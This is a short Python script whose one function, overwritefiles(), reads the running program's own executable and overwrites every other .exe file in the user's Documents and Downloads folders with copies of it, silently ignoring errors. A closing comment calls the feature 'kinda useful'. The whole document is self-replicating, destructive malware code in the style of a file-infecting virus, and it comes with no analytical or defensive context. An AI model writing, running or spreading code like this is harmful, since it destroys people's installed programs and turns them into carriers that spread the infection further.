import os
import sys
def overwritefiles():
    exe_path = sys.argv[0]
    with open(exe_path, "rb") as f:
        executable_data = f.read()
    directories_to_search = [
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Downloads"),
    ]
    for directory in directories_to_search:
        for root, dirs, files in os.walk(directory):
            if 'Startup' in root:
                continue
            for file in files:
                if file.lower().endswith(".exe"):
                    file_path = os.path.join(root, file)
                    if file_path.lower() != exe_path.lower():
                        try:
                            with open(file_path, "wb") as f:
                                f.write(executable_data)
                        except:
                            pass
#this feature is kinda useful